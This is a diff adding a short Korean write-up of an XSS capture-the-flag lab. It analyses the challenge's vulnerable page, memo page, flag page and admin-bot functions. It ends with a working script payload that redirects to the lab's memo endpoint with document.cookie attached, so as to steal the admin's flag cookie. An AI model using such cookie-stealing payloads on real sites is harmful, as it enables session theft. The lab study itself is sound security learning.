@@ -1,0 +1,18 @@
+Analysis)
+1. vuln(xss) page - GET 방식으로 파라미터 값을 받아 return ( <script>구문 삽입을 통한 xss )
+
+2. memo page - global memo_text 변수의 값을 memo param으로 받은 값으로 설정하고 memo.html에 출력
+
+3. flag page - 값 입력 후 제출 시 param으로 받게 되며 check_xss 함수에 param과 FLAG를 같이 넣어줌
+               
+4. xss-1.py
+   1) check_xss 함수 : param과 cookie를 받으며, 함수를 호출한 flag에서 cookie에 FLAG를 넣어줌
+                      이 후 url에 입력한 param을 인자로 vuln page에 넣어 read_url(url, FLAG)를 실행
+                      
+   2) read_url 함수  : local에서 관리자 권한으로 작동하는 웹 드라이버
+                      driver.add_cookie(cookie)부분에서 cookie를 설정
+                      driver.get(url)부분에서 작동
+
+Exploit) 
+xss 취약점으로 page redirect를 활용하여 쿠키 값 탈취
+   => <script>location.href="http://localhost:8000/memo?memo="+document.cookie</script>
